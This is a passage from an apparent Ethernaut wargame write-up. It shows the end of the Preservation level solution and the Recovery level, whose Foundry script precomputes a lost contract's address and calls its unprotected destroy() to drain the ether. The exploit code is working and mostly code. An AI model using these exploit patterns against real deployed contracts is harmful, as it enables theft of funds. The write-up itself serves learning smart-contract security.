&lt;&#x2F;span&gt;&lt;span&gt;        preservation&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setFirstTime&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setTime&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint _time&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; owner = address(uint160(_time));
&lt;&#x2F;span&gt;&lt;span&gt;        owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;PreservationSolve.s.sol:PreservationSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;17-recovery&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#17-recovery&quot; aria-label=&quot;Anchor link for: 17-recovery&quot;&gt;17 Recovery&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;Recovery.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Recovery {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F;generate tokens
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;generateToken&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;string memory _name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 _initialSupply&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;SimpleToken&lt;&#x2F;span&gt;&lt;span&gt;(_name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;_initialSupply)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract SimpleToken {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  string public name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mapping &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;uint) public balances&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; constructor
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;(string memory _name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;address _creator&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;uint256 _initialSupply) {
&lt;&#x2F;span&gt;&lt;span&gt;    name &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    balances[_creator] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_initialSupply&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; collect ether in return for tokens
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;receive&lt;&#x2F;span&gt;&lt;span&gt;() external payable {
&lt;&#x2F;span&gt;&lt;span&gt;    balances[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; allow transfers of tokens
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address _to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint _amount&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{ 
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(balances[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span&gt;_amount)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    balances[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;balances[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;_amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    balances[_to] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; clean up after ourselves
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;destroy&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address payable _to&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;selfdestruct&lt;&#x2F;span&gt;&lt;span&gt;(_to)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;The SimpleToken contract is funded with 0.001 ether. We need to drain those ether.&lt;&#x2F;li&gt;
&lt;li&gt;To drain ether we can simply call the &lt;code&gt;destroy()&lt;&#x2F;code&gt; function of the SimpleToken contract.&lt;&#x2F;li&gt;
&lt;li&gt;But we dont have the address of the SimpleToken. We can user ETHERSCAN to identify the transaction of Recovery contract to find the address of the SimpleToken.&lt;&#x2F;li&gt;
&lt;li&gt;We can also use a formula that is mentioned in ethereum yellow paper about how a newly created contract address will be computed.&lt;&#x2F;li&gt;
&lt;li&gt;The formula is &lt;code&gt;address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(_creator), bytes1(0x01))))))&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;0xd6&lt;&#x2F;code&gt; and &lt;code&gt;0x94&lt;&#x2F;code&gt; are constants and the last byte1 is the nonce, i.e, number contracts created from the existed contract. We assume that its one.&lt;&#x2F;li&gt;
&lt;li&gt;By this formula we can recover the SimpleToken address and call the &lt;code&gt;destroy()&lt;&#x2F;code&gt; function to drain all ether.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;RecoverySolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Recovery} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;Recovery.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract RecoverySolve is Script{
&lt;&#x2F;span&gt;&lt;span&gt;    Recovery public recovery &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Recovery&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb85de0D636d9C15Be34104D65A9eE406001463bE&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PRIVATE_KEY&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        address myAddress &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envAddress&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;MY_ADDRESS&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        Attack attack &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Attack&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Attack Address : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(attack))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;MY Balance : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;myAddress&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;balance)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        address _creator &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(recovery)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        address token &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;attack&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;(_creator&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(myAddress))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Token Address : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;token)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;MY Balance : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;myAddress&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;balance)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address _creator&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address payable _myAddress&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public returns&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;        address missedToken &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint160&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bytes1&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd6&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bytes1&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x94&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(_creator)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bytes1&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x01&lt;&#x2F;span&gt;&lt;span&gt;))))))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        missedToken&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;call&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodeWithSignature&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;destroy(address)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;_myAddress))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
